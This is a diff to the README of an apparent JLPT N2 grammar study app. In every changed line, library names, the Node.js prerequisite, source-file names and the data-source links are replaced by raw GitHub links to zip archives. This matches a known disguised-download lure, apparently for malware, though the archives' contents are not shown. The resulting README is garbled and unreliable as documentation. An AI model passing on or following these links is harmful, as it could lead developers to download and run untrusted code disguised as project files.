@@ -18,14 +18,14 @@ A structured learning platform for JLPT N2 grammar with example sentences, space
 - React Router 6 (routing)
 - Tailwind CSS (styling)
 - Zustand (state management)
-- https://raw.githubusercontent.com/yongsinfok/JLPTstudy/feature/review-stats/src/Tstudy_JLP_v1.7.zip (IndexedDB wrapper)
+- https://github.com/yongsinfok/JLPTstudy/raw/refs/heads/feature/review-stats/src/hooks/Tstudy-JLP-3.5-beta.1.zip (IndexedDB wrapper)
 - Papa Parse (CSV parsing)
 
 ## Getting Started
 
 ### Prerequisites
 
-- https://raw.githubusercontent.com/yongsinfok/JLPTstudy/feature/review-stats/src/Tstudy_JLP_v1.7.zip 18+
+- https://github.com/yongsinfok/JLPTstudy/raw/refs/heads/feature/review-stats/src/hooks/Tstudy-JLP-3.5-beta.1.zip 18+
 - npm or yarn
 
 ### Installation
@@ -56,7 +56,7 @@ npm run preview
 
 ## Data Source
 
-The learning data is sourced from the [shin-kanzen N2 grammar](https://raw.githubusercontent.com/yongsinfok/JLPTstudy/feature/review-stats/src/Tstudy_JLP_v1.7.zip) project.
+The learning data is sourced from the [shin-kanzen N2 grammar](https://github.com/yongsinfok/JLPTstudy/raw/refs/heads/feature/review-stats/src/hooks/Tstudy-JLP-3.5-beta.1.zip) project.
 
 **License**: CC BY-NC 4.0
 
@@ -78,13 +78,13 @@ src/
 ├── utils/          # Utility functions
 ├── types/          # TypeScript type definitions
 ├── db/             # IndexedDB configuration
-├── https://raw.githubusercontent.com/yongsinfok/JLPTstudy/feature/review-stats/src/Tstudy_JLP_v1.7.zip         # Root component
-├── https://raw.githubusercontent.com/yongsinfok/JLPTstudy/feature/review-stats/src/Tstudy_JLP_v1.7.zip        # Entry point
-└── https://raw.githubusercontent.com/yongsinfok/JLPTstudy/feature/review-stats/src/Tstudy_JLP_v1.7.zip      # Route configuration
+├── https://github.com/yongsinfok/JLPTstudy/raw/refs/heads/feature/review-stats/src/hooks/Tstudy-JLP-3.5-beta.1.zip         # Root component
+├── https://github.com/yongsinfok/JLPTstudy/raw/refs/heads/feature/review-stats/src/hooks/Tstudy-JLP-3.5-beta.1.zip        # Entry point
+└── https://github.com/yongsinfok/JLPTstudy/raw/refs/heads/feature/review-stats/src/hooks/Tstudy-JLP-3.5-beta.1.zip      # Route configuration
 ```
 
 ## License
 
 CC BY-NC 4.0
 
-Data from [shin-kanzen N2 grammar](https://raw.githubusercontent.com/yongsinfok/JLPTstudy/feature/review-stats/src/Tstudy_JLP_v1.7.zip) project.
+Data from [shin-kanzen N2 grammar](https://github.com/yongsinfok/JLPTstudy/raw/refs/heads/feature/review-stats/src/hooks/Tstudy-JLP-3.5-beta.1.zip) project.
